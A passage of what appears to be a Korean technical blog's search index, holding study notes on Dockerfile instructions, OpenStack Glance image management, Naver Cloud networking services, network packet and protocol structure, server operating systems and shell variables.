나열 $ docker build -t sample:1.0 /home/docker/sample # 명령 실행시 /home/docker/sample에 저장된 Dokerfile로부터 sample이라는 이름의 Docker 이미지 생성 RUN \u0026lt;실행할 명령어\u0026gt; RUN apt-get install -y nginx RUN [\u0026#34;/bin/bash\u0026#34;, \u0026#34;-c\u0026#34;, \u0026#34;apt-get install -y nginx\u0026#34;] RUN apt-get -y install \\ apache \\ php \\ ... CMD [\u0026#34;nginx\u0026#34; \u0026#34;-g\u0026#34; \u0026#34;daemon off\u0026#34;] CMD nginx -g \u0026#39;daemon off\u0026#39; # 문자열을 인수로 지정할 때는 \u0026#39;\u0026#39;를 사용 # RUN은 여러개 개술이 가능 # Exec(CMD), Shell도 사용방법은 동일 ENTRYPOINT \u0026lt;실행할 명령어\u0026gt; ENTRYPOINT [\u0026#34;nginx\u0026#34;, \u0026#34;-g\u0026#34;, \u0026#34;daemon off;\u0026#34;] ENTRYPOINT nginx -g \u0026#39;daemon off;\u0026#39; ONBUILD \u0026lt;실행할 명령어\u0026gt; # ONBUILD는 빌드 완료 후에 실행되는 명령어 STOPSIGNAL \u0026lt;시그널\u0026gt; # 컨테이너를 종료할 때에 송신하는 시그널 HEALTHCHECK \u0026lt;옵션\u0026gt; CMD 실행할 명령 # --interval=n / 헬스 체크 간격 / 기본 30s # --timeout=n / 헬스 체크 타임아웃 / 기본 30s # --retries=N / 타임아웃 횟수 / 3 ENV \u0026lt;key\u0026gt; \u0026lt;value\u0026gt; myName \u0026#34;mungmung\u0026#34; myOrder mungmungbab mungmunggug myName=\u0026#34;mungmung\u0026#34; \\ myOrder mungmungbab \\ mungmunggug # ENV는 환경변수로 \u0026lt;key\u0026gt;, \u0026lt;value\u0026gt; 값으로 이루어져 있음 WORKDIR \u0026lt;작업 디렉토리 경로\u0026gt; WORKDIR /first WORKDIR second WORKDIR third RUN [\u0026#34;pwd\u0026#34;] # WORKDIR은 타 명령여 ( RUN, CMD, COPY, ADD 등 )에서 작업을 실행시에 작업 디렉토리를 설정 USER \u0026lt;사용자명/UID\u0026gt; RUN [\u0026#34;adduser\u0026#34; \u0026#34;mung\u0026#34;] RUN [\u0026#34;whoami\u0026#34;] USER mung # 단, USER 명령에서 지정하는 사용자는 RUN 명령으로 미리 작성해 놓을 필요가 있다는 점에 주의가 필요 LABEL \u0026lt;Key name\u0026gt;=\u0026lt;Value\u0026gt; LABEL maintainer \u0026#34;...\u0026#34; LABEL title=\u0026#34;Title\u0026#34; LABEL version=\u0026#34;n.n\u0026#34; LABEL description=\u0026#34;This image is My_Server\u0026#34; # 라벨을 통해 Dockerfile을 빌드하여 생성된 이미지의 이름 및 상세 정보를 저장할 수 있다 EXPOSE \u0026lt;Port num\u0026gt; EXPOSE 8080 # 해당 포트는 공개(open) ARG \u0026lt;이름\u0026gt;[=기본값] ARG YOURNAME=\u0026#34;mung\u0026#34; RUN echo $YOURNAME mung # ARG는 Dockerfile에서 변수를 선언하고 사용할 수 있음 SHELL [\u0026#34;쉘의 경로\u0026#34;, \u0026#34;피라미터\u0026#34;] SHELL [\u0026#34;/bin/bash\u0026#34;, \u0026#34;-c\u0026#34;] RUN echo hello hello # SHELL 명령은 그 쉘을 통해 Dockerfile의 Shell 형식으로 RUN, CMD 명령 등을 수행 ADD [\u0026#34;\u0026lt;호스트 파일 경로\u0026gt;\u0026#34; \u0026#34;\u0026lt;Docker Image 파일 경로\u0026gt;\u0026#34;] ADD host.html /docker_dir/ # 추가하고 싶은 호스트의 파일 경로에는 Dockerfile의 디렉토리 내부를 지정하여 사용 COPY [\u0026#34;\u0026lt;호스트 파일 경로\u0026gt;\u0026#34; \u0026#34;\u0026lt;Docker Image 파일 경로\u0026gt;\u0026#34;] # 복사하고 싶은 호스트의 파일 경로에는 Dockerfile의 디렉토리 내부를 지정하여 사용 VOLUME [\u0026#34;/MountPoint] # VOLUME을 지정한 이름의 마운트 포이트를 작성 후, 호스트나 그 외 다른 컨테이너로부터 볼륨의 외부 마운트를 수행   "}),a.add({id:76,href:'/docs/openstack/openstack/glance/',title:"Glance",content:"이미지를 관리하는 서비스 : Glance   이미지를 관리하는 서비스 : Glance   Cloud Computing을 사용하기 위해서는 Virtual Machine을 생성하기 위한 이미지가 필요로 하며, Glance는 Nova에서 생성하는 인스턴스의 운영체제에 해당하는 이미지를 관리하는 서비스     Glance의 구성요소    Glance는 위의 그림과 같이 3가지의 구성요소로 이루어져 있다      구성요소 역할     Glance-api 이미지를 확인/ 복구/ 저장하는 등의 질의를 하기 이한 api 요청/ 응답을 담당   Glance-registry 이미지에 대한 메타데이터를 저장하고 처리하는 역할을 담당 및 Glance database에 저장된 데이터를 불러들이는 역할을 수행   Glance-database 이미지의 관련 정보들을 보관       논리 아키텍처의 Glance   Glance 사용자들은 glance-api로 이미지를 등록, 삭제, 관리 glance-api는 glance-registry와 Glance database에서 이미지를 관리 이미지를 등록할 때는 glance-registry로 Glance database에 저장 등록된 이미지를 사용할 때는 Glance database에 바로 사용을 요청 관리자는 운영하려는 운영체제의 이미지를 glance-registry로 Glance database에 등록     가상 머신 이미지 포맷   aki: 아마존 커널 이미지 ami: 아마존 머신 이미지 ari: 아마존 ram 디스크 이미지 iso: 광학 디스크나 CD-ROM의 데이터 콘텐츠를 지원하는 아카이브 포맷 qcow2: QEMU 에뮬레이터가 지원하는 포맷, 동적으로 확장할 수 있으며, Copy on Write를 지원 raw: 구조화되지 않은 디스크 포맷 vdi: VirtalBox 모니터와 QEMU 에뮬레이터가 지원하는 디스크 포맷 vhd: VHD 디스크 포맷은 VMware, Xen 마이크로소프트, VirtualBox 같은 가상 머신 모니터가 사용하는 일반적인 디스크 포맷 vhdx: VHDX 디스크 포맷은 큰 디스크 크기를 지원하는 VHD 형식의 향상된 버전 vmdk: 일반적인 디스크 포맷으로 여러 가상 머신 모니터가 지원     컨테이너 포맷(container Format)   aki: 아마존 커널 이미지 ami: 아마존 머신 이미지 bare: 아마존 ram 디스크 이미지 docker: Docker 컨테이너 포맷 ova: tar 파일의 OVF 패키지 ovf: OVF 컨테이너 포맷        Glance 명령어  현재 이미지 목록 확인  openstack image list   특정 이미지의 자세한 정보 확인  openstack image show [이미지 이름]   이미지 삭제  openstack image delete [이미지 이름]   이미지 추가  openstack image create --public --container-format bare --disk-format qcow2 --file [경로를 포함한 이미지 파일 이름] [이미지 이름]    커스텀 이미지 생성   xming 윈도우에 설치   CentOS 준비 후 CentOS에 가상머신 프로그램 설치 및 실행  $ yum install qemu kvm qemu-kvm libvirt virt-install bridge-utils virt-manager dejavu-lgc-sans-fonts virt-viewer $ systemctl restart libvirtd  ISO 파일로 qcow2 각 이미지에 맞는 파일 생성  qemu-img create -f qcow2 [이미지 파일 위치] [이미지 파일 크기] qemu-img create -f qcow2 /test/centos7.qcow2 10G  ISO로 가상머신 생성  $ virt-install --name centos \\ --ram 1024 --disk \\ [비어있는 이미지 파일 위치],format=qcow2 \\ --network network=default \\ --graphics vnc,listen=0.0.0.0 \\ --noautoconsole \\ --os-type=linux \\ --os-variant=centos7.0 \\ --location=[ISO 위치]  본체 윈도우에서 putty x11 설정  Putty -\u0026gt; SSH -\u0026gt; X11 -\u0026gt; Enable X11 Forwarding 체크 -\u0026gt; X display location : localhost:0 설정 후 접속     virt-manager 생성한 QEMU 가상머신 설정  SELINUX 끄기 acpid 설치 및 설정 cloud-init 및 cloud-utils 설치 및 설정 /etc/sysconfig/network qemu-guest-agent 설치 및 설정 grub 수정     생성한 가상머신에서 이미지 작업 ( 커스터 마이징 )   설치 후 설정  yum install -y /usr/bin/virt-sysprep virt-sysprep -d centos	\u0026lt;-네트워크 장치의 MAC주소와 같은 정보를 삭제하는 작업 virsh undefine centos	\u0026lt;-가상머신 삭제하는 작업    "}),a.add({id:77,href:'/docs/ncp/ncptraining/nca03/',title:"Naver Cloud Network",content:"Network   외부와의 통로, 내부와의 통로 뿐만이 아닌, DNS, CDN과 같은 다양한 서비스를 제공    Nework Service의 종류   Load Balancer   부하 분산을 위해 서버 앞단에서 트래픽을 분산\n  HAProxy를 이용하여 로드밸런싱\n Proxy 방식 : 서버에서는 클라이언트의 IP 확인하고자 하 때 SSL/TCP의 경우 Proxy Protocol을 사용 HTTP/HTTPS의 경우 X-Forwarder를 사용       최대 6만 TPS(Transaction Per Second)까지 보장\n  로드밸런싱 알고리즘\n  Round Robin : 클라이언트에서 요청이 오면 서버에 1개씩 분배하는 방식\n  Least Connection : 클라이언트 연결이 제일 적은 서버에게 새로운 커넥션을 분배하는 방식\n  Source IP Hash : 클라이언트 IP에 대한 해시테이블을 가지고 클라이언트 IP에 매핑되는 서버에 새로운 커넥션을 분배하는 방식\n         DNS    다양한 레코드 지원 ( A, NS, PTR, AAAA, MX, CNAME, SPF )\n  등록 도메인으로 인입되는 트래픽을 분기 ( Round Robin )\n  등록된 도메인은 Health Check 불가능\n    CDN ( Contens Delivery Network    CDN을 사용하는 이유는 보다 빠르게 사용자에게 데이터를 전달하고 웹 서비스의 부하를 줄이기 위해 사용\n  CDN+ : 국내전용 / GCDN : 국외 전용\n  원본은 NCP 오브젝트 스토리지 혹은 커스텀 오리진 서버를 둘 수 있음\n  도메인은 랜덤 CDN 도메인 (*.ntruss.com)혹은 보유하고 있는 도메인 사용가능\n  지원 프로토콜은 HTTP/S\n     IPSEC VPN    고객의 사내망과 NCP 간 사설 통신을 위한 IPSEC VPN 서비스\n  고객의 VPN 장비와 NCP VPN 장비 간 터널링 연결 제공 ( 통신 방식 호환필요 )\n  NCP 서버들들은 Private Subnet 대역 ( 192.168.x.x ) 으로 통신 필요\n  BW 최대 30Mbps 제공\n     NAT Gateway    비공인 IP를 가진 다수의 서버에게 대표 공인 IP를 이용한 외부 접속을 제공\n  Auto Scaling과 연계된 자동 설정 제공\n  보안상 다수의 공안 IP에 대한 ACL을 오픈할 수 없는 경우 혹은 공인 IP 생성 비용 절약가능\n     Global Route Manager    DNS 기반의 다양한 방법을 통해 네트워크 트래픽을 안정적으로 로드밸런싱하는 GSLB 상품\n  DNS 기반의 로드밸런싱 서비스 제공을 통해 지역별 트래픽 기반 부하 분산, DR 구축 등에 사용할 수 있는 상품\n  로드밸런싱 타입은 4가지 제공 ( Round Robin, Weighted, GeoLocation, Failover )\n  IP에 대한 HealthCheck만 제공\n    "}),a.add({id:78,href:'/docs/network/network/packet/',title:"Network Packet",content:"네트워크 패킷 ( Network Packet )    패킷이란 데이터의 묶음 단위로 한번에 전송할 데이터의 크기\n  제 3계층 이상 ( Network 계층 ) 에서는 이 데이터의 묶음을 패킷이라고 부르며, 제 2계층에서는 프레임( Frame )\n  패킷의 크기는 네트워크의 종류에 따라 크기가 다름\n  패킷을 이렇게 나눠 보내는 이유는 컴퓨터는 동시다발적으로 데이터를 전송하는 데, 한 데이터에게만 데이터를 줄 경우, 한 컴퓨터와의 통신밖에 하지 못하기에, 데이터를 나눠 모두에게 통신할 수 있게 하며, 중간에 에러가 날 경우를 대비\n     패킷의 기본 구조      크게 패킷은 헤더 ( header ) 와 페이로드 ( Payload ) 두 부분으로 나누어 진다.\n Hader: 출발 주소, 도착 주소, 패킷 길이 등 ( 헤더에 종류에 따라 내용이 달라질 수 있음 ) Payload: 전송되는 실제 콘텐츠나 데이터 ( 이메일, 메시지, 인터넷 전화, 웹서핑 세션 등)    즉 위의 그림과 같이 데이터는 계층의 헤더 ( Hader ) + 페이로드 ( Payload )로 이루어져 있으며, 헤더가 붙은 계층에 따라 비트, 프레임, 패킷, 세그먼트, 데이터 라 한다.\n     각 네트워크 계층의 단위 \rNetwork Layer \r...\r\r 데이터 (Data): 상위 계층 ( OSI 7-5 Layer Sesstion, Presentation, Application )\n 세그먼트 ( Segment ): ( OSI 4 Layer Transport )\n 패킷 ( Packet ): ( OSI 3 Layer Network )\n 프레임 ( Frame ): ( OSI 2 Layer DataLink )\n 비트 ( Bit ): ( OSI 1 Layer Physical )\n     \r\r\r  헤더는 우편 봉투에 적혀있는 주소와 유사한 열할을 하며, 페이로드는 편지봉투 안의 편지 내용을 뜻한다 할 수 있다\n  데이터는 데이터 상태로 상대방에게 바로 전달해주지 못한다. 그렇기에 상대방이 데이터를 볼 수 있게 송신과정을 거쳐야 하는 데 이를 인 캡슐레이션 이라 하며, 수신자는 반대로 수신과정을 거치는 데 이를 디 캡슐레이션 이라 한다.\n   네트워크 인 캡슐레이션 ( Network Encapsulation )  \rNetwork Encapsulation \r...\r\r   위에 언급한 듯이 송신자가 수신자에게 데이터를 볼 수 있도록 포장하는 것을 인캡슐레이션이라 하며 이는 OSI L7에서 L1 방향으로 진행 된다.\n  Payload를 4 계층 TCP 헤더로 캡슐화( 세그먼트 ) -\u0026gt; IPv4, TCP 헤더로 캡슐화 ( 패킷 ) -\u0026gt; IPv4, TCP, Ethernet( 프레임 )으로 캡슐화 하는 것을 인 캡슐레이션이라 한다.\n  \r\r\r 네트워크 디 캡슐레이션 ( Network Depsulation )  \rNetwork Decapsulation \r...\r\r  인캡슐레이션 되어진 ( 포장되어진 ) 페이로드를 읽기위해서 포장되어진 역 순서로 다시 헤더를 제거하는 것을 디 캡슐레이션이라 하며, OSI L1에서 L7 방향으로 진행 된다.\n  Payload를 IPv4, TCP, Ethernet ( 프레임 ) -\u0026gt; IPv4, TCP, ( 패킷 ) -\u0026gt; TCP ( 세그먼트 ) -\u0026gt; 데이터로 캡슐화를 해제하는 것을 디 캡슐레이션이라 한다.\n  \r\r\r   각 계층의 Protocol   각 프로토콜은 2진수 1개 = 1bit 2진수 8개 = 8bit 2진수 4개 = 16진수 1개 16진수 2개 = 2진수 8개 16진수 2개 8bit = 1byte를 뜻함   2계층 ( Data-Link )    2계층은 하나의 네트워크 대역 즉, 네트워크 상에 존재하는 여러 장비들 중에서 어떤 장비에게 보내는 데이터를 전달하는 역할 을 수행.\n  추가적으로 오류제어, 흐름제어 수행.\n  하나의 네트워크 대역 LAN에서만 통신할 때 사용하며,다른 네트워크와 통신 할 때에는 3계층이 도와주어야만 통 신이 가능\n    Ethernet 14byte Destination Address: 데이터를 전달받은 상대방의 시스템 MAC 주소 6byte Source Address: 데이터를 전달하는 시스템의 MAV 주소 6byte 상위 프로토콜 타입: 2byte, IPv4 ( 0x0800 ), ARD ( 0x0806 )     3계층 ( Network )  ARP Protocol    ARP 프로토콜은 같은 네트워크 대역에서 통신을 하기 위해 필요한 MAC주소를 IP주소를 이용해서 알아오는 프로토콜\n  같은 네트워크 대역에서 통신을 한다고 하여도 데이터를 보내기 위해서는 7계층부터 캡슐화를 통해 데이터를 보내기 때문에 IP주소와 MAC주소가 모두 필요하며, 이 때 IP주소는 알고 있어도 MAC 주소는 모르더라도 ARP를 통해 통신이 가능\n  ARP는 같은 대역에서만 사용가능\n     Hardware type, Protocol type, Hardware Address Length, Protocol affress Length는 모두 고유의 값을 가짐\n  Opcode: 세팅이 1이면 요청, 2면 답하는 것으로 세팅 됨\n  최소는 60byte, 최대는 1514byte\n   \rARP Process\r...\r\r  목적지 주소를 알지 못해, 목적지 주소 ( MAC )자리에는 0으로 비워둠\n  인캡슐레이션 후, 주소를 알지 못해 브로드캐스트 방식으로 모두에게 요청을 보낸 후, 아이피가 맞지 않으면 버리고, 맞는 아이피를 가지고 있는 PC는 자기의 주소를 다시 송신하고, 그러면 초기 송신자는 목적지 주소( MAC )를 알 수 있게 되어지는 원리\n   발신자\n 수신자\n\r\r\r   IPv4 Protocol    IPv4는 네트워크 상에서 데이터를 교환하기 위한 프로토콜이지만, 데이터가 정확하게 전달될 것을 보장하지는 않음\n  복된 패킷을 전달하거나 패킷의 순서를 잘못 전달할 가능성도 있음 (악의적으로 이용되면 DoS 공격이 됨 )\n  데이터의 정확하고 순차적인 전달은 그보다 상위 프로토콜인 TCP에서 보장\n    구조 설명   Version: IP 프로토콜의 버전 ( 대부분이 4, 16진수 중 하나 )\n  IHL ( Hearder Length ): 헤더의 길이 표현법 = n/4 최소 20 ~ 60\n  Type of Service ( TOS ): 데이터의 형식으로 현재는 잘 쓰이지 않으며 0으로 비워둠\n  Total Length: 모두를 합친 전체의 길이를 뜻함\n  Identification: 조각화 된 데이터의 ID를 부여하는 것\n  IP Flags X: 쓰이지 않음, D: 데이터를 송싱자가 안쪽에서 설정하는 것, M: 조각화가 진행될 경우 1로 세팅, 그렇지 않을 경우 0\n  Fragment Offset: 조각화가 발생했을 때 조각들의 시작 위치를 나타내는 값\n  offset: 어느 기준으로부터 얼마만큼 떨어져있는 지를 나타냄\n  Time to Live ( TTL ) : 패킷이 유지 될 수 있는 시간 ( 횟수 ), 네트워크 장비를 지나갈 때마다 1씩 줄어듬\n       ICMP Protocol   8 ( 요청 )/ 0 ( 정상적인 응답 ) 3 ( 목적지 도착 불가능 ) / 11 ( 시간 초과 ) 5 ( 리 다이렉트, 라우팅 테이블 수정 )    4계층 ( Transport )    4계층 전송 계층 ( Transprot layer )은 송신자의 프로세스와 수신자의 프로세스를 연결하는 서비스 를 제공하는 계층이다.\n  전송 계층은 연결 지향 데이터의 스트림 지원, 신뢰성, 흐름 제어, 그리고 다중화와 같은 편리한 서비를 제공한다.\n  전송 프로토콜 중 가장 장 알려진 것은 연결 지향전송박시으로 사용하는 전송제어 프로토콜( TCP ) 단순한 전송에 사용되는 사용자 데이터 프로토콜 ( UDP ) 가 있다\n   UDP Protocol    UDP 프로토콜 ( User Datagram Protocol )은 데이터 그램 프로토콜 ( Universal Datagram Protocol )이라고 일컫기도 한다.\n  UDP의 전송 방식은 너무 단순해서 서비스의 신뢰성이 낮고, 데이터그램의 도착 순서가 바뀌거나, 중복되거나, 심지어는 통보 없이 누락 시키기도 한다.\n  UDP는 일반적으로 오류의 검사와 수정이 필요 없는 프로그램에서 수행할 것으로 가정해야 한다.\n      TCP Protocol    전송 제어 프로토콜 (Transmission Control Protocol ) 은 인터넷에 연결된 컴퓨터에서 실행되는 프로그램 간에 통신을 안정적으로, 순서대로 에러없이 교환 할 수 있다\n  TCP의 안정성을 필요로 하지 않은 애플리케이션의 경우 일반적으로 TCP 대신 비접속형 사용자 데이터그램 프로토콜 ( User Datagream Protocol )을 사용하여, TCP는 UDP보다 안전하지만 느리다\n    TCP Fags  Window: 상대방과 데이터를 주고 받을 때, 얼마만큼의 데이터를 보낼 지 정하는 역할을 수행 ( 남아있는 TCP 공간을 알려줌 ) TCP Flags : 어떤값을 보낼지 세팅하는 값 C, E: 사용하지 않음 U: Uregent ( 긴급 bit ) - 우선순위가 포함되어있음 ( 1- 급한 데이터 ) A: Acknowledgment ( 승인 bit ) P: Push ( 밀어넣기 bit ) R: Reset ( 초기화 bit ) S: Syn ( 동기화 bit ) - 상대방과 연결을 시작할 때 반드시 사용 F: Fin ( 종료 bit )     3Way Handshake \r3Way Handshake\r...\r\r  TCP를 이용한 데이터 통신을 할 때 프로세스와 프로세스를 연결하기 위해 가장 먼저 수행되는 과정\n  클라이언트가 서버에게 요청 패킷을 보내고\n  서버가 클라이언트의 요청을 받아 패킷을 보내고\n  클라이언트는 이를 최종적으로 수락하는 패킷을 보낸다.\n      과정설명   보낸 쪽에서 보낼 때는 SEQ번호와 ACK번호가 그대로이다.\n  받는 쪽에서 SEQ번호는 받은 ACK번호가 된다.\n  받는 쪽에서 ACK번호는 받은 SEQ번호 + 데이터 크기가 된다.\n    \r\r\r   7계층 ( Application )  HTTP Protocol    DNS Protocol    기존의 192.168\u0026hellip;.. 등의 호스트 도메인의 이름을 네트워크 주소로 바꾸거나 그 반대의 변환을 수행을 위해 개발되어짐\n  일반적으로 www.xxx.com과 같은 도메인 주소를 입력하면 해당 주소에 맞는 IP주소로 변환시켜주는 역할을 수행\n  \rDNS 서버는 계층 구조로 이루어져 있음\r...\r\r DNS 서버는 계층 구조   루트 DNS 서버\n 최상위 레벨의 DNS 서버\n 책임 DNS 서버\n 로컬 DNS 서버로 구성\n    \r\r\r}\n     Domain address    인터넷 상에서의 주소인 URL의 일부\n  도메인 또는 도메인 네임( Domain name )은 넓게 보면 암기 및 식별하기 어려운 IP주소를 example.com처럼 기억하기 쉽게 만들어주는 네트워크 호스트를 의미\n  보통 루트 네임 서버( 최상위 DNS서버로 JAVA에서 관리 )에 등록된 최상위 호스트 네임을 관리하는 도메인 레지스트리에서 관리하는 하위 호스트 네임을 이르는 말\n     쿼리( Query )  재귀 쿼리\n 로컬 DNS서버와 주고받는 질의와 응답     반복 쿼리\n 로컬 DNS 서버가 다른 DNS 서버와 주고 받는 응답     권한이 없는 응답\n 반복 쿼리를 통해 알아온 주소     권한이 있는 응답\n 로컬 DNS가 알고 있는 주소     ZONE 영역파일   호스트 IP를 저장하고 있는 파일      IP( Internet Protocol )은 네트워크 계층에서 사용하는 주소로, 컴퓨터는 MAC주소를 사용하지만, 사람이 읽기 힘들어 읽기 편한 IP주소를 사용 한다.\n  3계층은 다른 네트워크 대역 즉, 멀리 떨어진 곳에 존재하는 네트워크까지 어떻게 데이터를 전달할지 제어하는 일을 담당, 발신에서 착신까지의 패킷의 경로를 제어하는 역할을 수행 하며 거리가 먼 다른 기기와 통신을 위해서는 3계층이 필요하다\n   "}),a.add({id:79,href:'/docs/infra/infra/infra03/',title:"Operating System",content:"운영체제의 종류    Linux Server    오픈소스의 대표적인 운영체제로는 리눅스를 제일 먼저 꼽을 수 있으며, 리눅스에는 여러 배포판이 존재합니다.\n  배포판에 따라 애프리케이션 및 패키지 관리방법에 차이가 있으며, 각 설치 방법에도 차이가 존재합니다.\n  유상지원에는 대부분 Red hat 계열을 선택하며, 유상지원이 필요없을 시에는 다른 계열을 주로 사용합니다.\n    레드햇 계열   Red hat Enterprise Linux\n  CentOS\n  Fedora\n  Vine Linux\n  Scientific Linux\n  Oracle Linux\n      데비안 계열   Debian\n  KNOPPIX\n  Ubuntu\n  Linux Mint\n       Linux Sever의 장점    이식성과 확장성이 용이합니다.\n 리눅스는 대부분 C언어와 어셈블리 언어로 되어 있어 특정 기계에 비의존적인 특징을 가지고 있어 이식 미치 확장에 용이합니다.       텍스트 모드 중심의 관리와 다양한 관리 환경의 제공\n GUI 기반이 아닌 DOS창에 주로 특화되어 있으며, 직접 설정 파일을 설정하거나 단순 명령어를 통해 작업을 수행하여 능숙한 사람들에게는 빠른 작업을 도와주지만, 서툰사람들에게는 접근이 어려운 장, 단점이 있습니다.       풍부한 소프트웨어 개발 환경 제공\n 유닉스 시스템과 리눅스 시스템은 거의 모든 프로그래밍 언어를 제공하며, 대부분이 오픈소스로 제공되기 때문에 풍부한 개발 환경을 제공받습니다.       다양한 네트워크 서비스 및 작업환경 지원\n 오픈소스 소프트웨어 형태로 제공된느 많은 프로그램을 사용하여 다양한 웹서비스를 구축 및 서비스 할 수 있습니다.       뛰어난 안정성\n 리눅스는 C언어 기반이기며, 국제적이고 개방적인 개발 환경을 가지고 있어 커널 및 응용 프로그램에 중대한 버그가 있을 경우 빠른 패치가 공개되며, 커널, 파일 시스템, 쉘, 웹서비스 프로그램 등 리눅스 시스템의 기반이 되는 모든 프로그램이 소스코드가 공개되어 있어 최적화 및 안정성이 뛰어나다 할 수 있습니다.       시스템 보안성\n 리눅스의 공개 코드 상에서 보안상 문제로 지적되는 경우가 있지만, 리눅스 커널은 상단한 기간 동안의 연구, 전세계의 개발자들로부터의 협업을 통해 만들어졌기 때문에, 관리자가 보안을 기울인다면 보안성이 뛰어나다고 할 수 있습니다.       폭 넓은 하드웨어 장치 지원\n 리눅스 개발에는 많은 하드웨어 관련 기업이 참여하여, 리눅스는 대부분의 하드웨어 장치를 지원하는 드라이버를 포함하고 있습니다.       저수준 하드웨어로 구성된 시스템의 사용 가능\n 리눅스 서버 시스템으로 사용하기 위한 최소한의 설치를 하면 하드 디스크를 차지하는 전체 운영체제의 용량이 적고 요구하는 하드디스크의 성능도 높지 않습니다.       저 수준 하드웨어로 구성된 시스템의 사용 가능\n 리눅스는 서버 시스템으로 사용하기 위한 최소한의 설치를 하면 하드 디스크를 차지하는 전체 운영체제의 용량이 적고 요구하는 하드디스크의 성능 또한 높지 않습니다.       시스템의 높은 신뢰성\n 리눅스는 RAID 기능을 지원하고 로컬 또는 인터넷을 통한 다양한 백업 방식을 지원하며, 확장자들을 지원합니다.       가성비\n  리눅스는 비용을 들이지 않아도 CentOS, Debian 등 다양한 종류의 리눅스를 다운로드하여 설치 및 사용이 가능합니다.\n  리눅스는 고가의 서버 운영체제아 비교하여 손색이 없으며 서버 관리자의 역량에 따라 유료 서비스를 받지 않더라도 서버 시스템의 운영이 가능하다.\n       Window Server    Window Server는 마이크로소프트가 제공하는 서버용 운영체제로, 리눅스\u0026amp;유닉스와 윈도우의 가장 큰 차이가 GUI 조작이라고 하던 시절도 있었지만, 현재에는 유닉스\u0026amp;리눅스 또한 GUI조작을 할 수 있는 환경을 갖추고 있습니다.\n  하지만 이미 Window의 UI에 익숙한 사람들이 다수 존재하여 서버에 대한 문턱이 낮아 서버가 익숙하지 않은 사용자에게 장점을 가지고 있습니다.\n     Window Server의 장점    윈도우 서버에서 실행되는 소프트웨어를 사용해야 할 때\n Exchange Server, Sharepoint, SQL Server와 같은 마이크로소프트의 제품을 사용하고 싶거나, 오라클 데이터베이스나 각사의 소프트웨어처럼 윈도우나 리눅스 등 여러 운영체제에서 가동하는 제품을 윈도 서버에서 사용하고 싶을 때 윈도우 서버를 선택합니다.       닷넷(.NET) 프레임워크를 사용하고 싶을 때\n 마이크로소프트는 닷넷 프레임워크(Net Framework)라는 애플리케이션 개발 및 실행 환경을 제공하며, 닷넷은 업무 애플리케이션을 개발할 때 자주 사용되는 기능을 패키지로 묶은 프로그램입니다. 이를 활용하여 애플리케이션을 단기간에 쉽게 개발할 수 있는 특징이 있어 SI 계통에서 많이 채용됩니다.       액티브 디렉터리 환경을 사용하고 싶을 때\n 액티브 디렉터리(Active Directory)란 마이크로소프트가 개발한 디렉터리 서비스 시스템으로, 오피스 환경에서 윈도우 PC나 프린터, 서버 같은 하드웨어 자원과 사용자의 각종 권한을 관리하고 싶을 때 사용됩니다.       윈도우 서버 라이선스 체계   윈도우 서버의 라이선스 체계는 CPU 두 개당 라이선스 하나를 추가로 구매해야 윈도 서버를 이용할 수 있다.   Linux Sever와 Window Server의 차이점    다중 사용자\n 리눅스는 서버 다른 사용자가 동시에 시스템을 사용할 수 있는 운영체제이지만 윈도우의 경우 하나의 시스템에 한 명의 사용자가 로그인하여 사용기 가능합니다.(소프트웨어를 통해 다중 사용자 시스템 설치 가능)       소스코드 공개\n Window는 소스코드가 공개되지 않는 반면 Linux는 소스코드가 공개되어있습니다.       X Window 시스템\n 윈도우는 OS 자체가 GUI를 제공하는 단일 인터페이스 체제이지만, 리눅스는 X Window라는 환경에 따라 매니저가 개발되어 제공됩니다. 자체적인 커스터마이징이 가능       텍스트 모드\n 윈도우에서는 명령 프롬프트를 사용하지만, 리눅스는 텍스트 모드가 있는 데 이는 쉘 혹은 콘솔 환경을 사용합니다.       파일, 패스, 드라이브\n 윈도우와 달리 리눅스에서는 확장자가 없는 파일이 존재 할 수 있으며, 드라이브의 개념이 없고 하나의 루트(/) 안에 모든 하드디스크와 파티션, 디바이스들이 연결되어 있으며, 윈도우에서는 , 리눅스에서는 /로 패스를 분리합니다.       UNIX Sever   이전에는 웹 서버나 메일 서버 등 다양한 서버 용도로 유닉스를 이용했지만, 현재는 무료로 사용할 수 있는 리눅스 등의 오픈 소스 계열 운영체제가 많이 보급되어 대부분의 서버는 오픈 소스 게열 운영체제로 구축되며, 유닉스는 주로 엔터프라이즈 서버 운영체제로 이용되는 일이 많아져 엔터프라이즈 서버업체 제품과 밀접하게 관련되어 있다 할 수 있습니다.     대표적인 운영체제    AIX\n  Solaris\n  HP-UX\n    "}),a.add({id:80,href:'/docs/development/shell/shell-3/',title:"Shell Script 문법",content:"Shell Programming    Shell 문법  Shell 변수    Shell 에서 변수는 사용할 때 선언\n  변수에 초기 값을 대입할 때 변수를 만들게 된다.\n  모든 변수는 문자열로 간주\n  숫자 값을 가지는 경우에도 문자열로 간주\n  변수는 대소문자가 구별 (Linux 시스템의 특성)\n  변수에 값이 부여될 때를 제외하고, 변수를 사용할 경우 변수 앞에 \u0026lsquo;$\u0026lsquo;의 표시를 붙여야 한다.\n  변수에 부여된 값은 echo 명령을 통해 확인 가능\n  변수에 저장될 문자열 값 중 빈 칸을 포함하고 있다면 \u0026quot; \u0026ldquo;을 이용하여 값을 부여\n    예시  $ HI=Hello $ echo $HI Hello $ HI=\u0026#34;Hello Shell Progamming!\u0026#34; $ echo $HI Hello Shell Progamming! $ vi HI.sh HI=\u0026#34;ByeBye!\u0026#34; echo $HI echo \u0026#34;$HI\u0026#34; echo \u0026#39;$Hi\u0026#39; echo \\$HI echo Hello and \u0026#34;$HI\u0026#34;?    Shell의 환경 변수    Shell Script가 시작 될 때 일부 변수는 환경의 값을 통해 초기화 되는 데, 이를 환겨변수라고 한다.\n  사용자 정의 (쉘) 변수와 구분하기 이해 보통 대문자로 선언하는 것이 보통\n  환경변수는 각 사용자 환경에 따라 값이 다름\n    $HOME  현재 사용자의 홈 디렉토리       $PATH  명령을 검색하는 디렉토리들의 목록 , \u0026lsquo;:\u0026lsquo;으로 구분       $PS1  대개 \u0026lsquo;$\u0026lsquo;인 명령 프로픔트       $PS2  추가적인 입력을 요구할 때 사용되는 2차 프롬프트 주로 \u0026lsquo;\u0026gt;\u0026lsquo;를 의미       $IFS  입력 필드 구분자 . Shell 이 입력을 받아들일 때 단어를 구분하는 데 사용되는 문자의 목록으로, 대개 빈 칸, 탭, 새 줄 문자를 의미       $0  Shell Scripot의 이름       $#  전달된 파라미터의 수       $$  **/tmp/tmpfile_$$와 같이 종종 독트간 임시 파일 이름을 생성하기 위해 Script에서 사용되는 Shell Script의 프로세스 ID**       Shell 파라미터 변수   Script 가 